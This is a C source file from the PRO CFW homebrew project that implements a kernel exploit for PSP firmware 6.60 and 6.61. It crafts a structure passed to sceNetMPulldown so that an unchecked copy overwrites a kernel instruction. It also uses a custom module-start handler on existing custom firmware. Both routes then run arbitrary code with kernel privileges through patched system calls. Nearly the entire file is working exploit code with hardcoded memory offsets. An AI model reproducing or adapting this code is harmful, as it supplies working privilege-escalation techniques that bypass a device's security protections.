/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "globals.h"
#include "functions.h"
#include "kxploit.h"

#include "libs/libsploit/scanner.c"

/*
Mix between the CFW kxploit and the sceNetMPulldown Kernel Exploit for PSP 6.60 and 6.61
*/

#define SYSMEM_TEXT_ADDR 0x88000000

//#define BETA_660

/*
6.00 DT: 0x0000CCA4 - 0x000041F4
*/

#ifdef BETA_660
#define PATCH_OFFSET 0x0000D464
#define POWERLOCK_OFFSET 0x00006640
#else
#define PATCH_OFFSET 0x0000CBB8
#define POWERLOCK_OFFSET 0x000040F8
#endif

// beta 600 DT
//#define PATCH_OFFSET 0x0000CCA4
//#define POWERLOCK_OFFSET 0x000041F4

#define PATCH_ADDR SYSMEM_TEXT_ADDR+PATCH_OFFSET // exact address of patch
#define PATCHED_INST 0x3C058801 // the original instruction

UserFunctions* g_tbl;

void* (*set_start_module_handler)(void*) = NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
void (*prev)(void*) = NULL;

u32 patch_instr = 0;
u32 patch_addr = 0;

struct MPulldownExploit;
int (* _sceNetMPulldown)(struct MPulldownExploit *data, int unk1, int unk2, int unk3);

struct MPulldownExploit {
    u32 *data; // unk_data
    int unk1; // should be 0
    void *target;
    int target_size;
    u32 unk_data[80]; // embeeded it
};

// on CFW, we can setup a custom function to handle module loading, this function executes with kernel priviledges
void my_mod_handler(void* mod){

    // corrupt kernel, simulates typical NOP in sceKernelLibcTime so we can pass a second argument
    u32 libctime = (void*)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0x27CC57F0);
    patch_addr = libctime + 4;
    patch_instr = _lw(patch_addr);
    _sw(NOP, patch_addr);

    // fallback to previous handler
    if (prev){
        prev(mod);
    }
    set_start_module_handler(prev);
}

int stubScanner(UserFunctions* tbl){
    g_tbl = tbl;
    for (int i=0; i<7; i++) g_tbl->UtilityLoadModule(0x100+i);
    _sceNetMPulldown = g_tbl->FindImportUserRam("sceNetIfhandle_lib", 0xE80F00A4);

    // weak import in ARK Loader, we later check if it's actually available
    set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB);
    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);

    return 0;
}

void repairInstruction(KernelFunctions* k_tbl){
    if (patch_addr && patch_instr){
      _sw(patch_instr, patch_addr);
    }
}

int doExploit(void){
    struct MPulldownExploit *ptr;
    int ret;
    u32 interrupts;

    prev = NULL;

    // CFW check
    if (set_start_module_handler){
      // check if the sctrlHENSetStartModuleHandler (CFW-only) import has been properly linked
      u16 start_module_syscall = _lh((u32)set_start_module_handler+6);
      if (start_module_syscall && start_module_syscall != 0x2402){
        PRTSTR("CFW detected");
        prev = set_start_module_handler(my_mod_handler); // register our custom handler
        g_tbl->UtilityLoadModule(PSP_MODULE_NP_DRM); // trigger StartModule handler
        g_tbl->UtilityUnloadModule(PSP_MODULE_NP_DRM); // not really needed but whatever
        return (patch_addr == 0 || patch_instr == 0);
      }
    }

    patch_instr = PATCHED_INST;
    patch_addr = PATCH_ADDR;

    ptr = (void*)0x00010000; // use scratchpad memory to bypass check at @sceNet_Service@+0x00002D80
    memset(ptr, 0, sizeof(*ptr));
    ptr->data = ptr->unk_data;
    ptr->target_size = 1;
    ptr->target = (void*)(PATCH_ADDR - ptr->target_size);

    ptr->data[2] = (u32)(ptr->data);
    ptr->data[3] = 4;
    ptr->data[4*4+3] = 1;

    // sceNetMCopydata didn't check ptr->target validation
    ret = _sceNetMPulldown(ptr, 0, 5, 0); // @sceNet_Service@+0x00003010
    
    g_tbl->KernelIcacheInvalidateAll();
    g_tbl->KernelDcacheWritebackAll();
    
    for (int i=6; i>=0; i--) g_tbl->UtilityUnloadModule(0x100+i);
    return 0;
}

void executeKernel(u32 kfuncaddr){
    u32 kernel_entry, entry_addr;
    if (prev){ // CFW
        // can pass second argument to sceKernelLibcTime
        _sceKernelLibcTime(0x08800000, KERNELIFY(kfuncaddr));
    }
    else {
        kernel_entry = kfuncaddr;
        entry_addr = ((u32) &kernel_entry) - 16;
        g_tbl->KernelPowerLock(0, ((u32) &entry_addr) - POWERLOCK_OFFSET);
    }
}

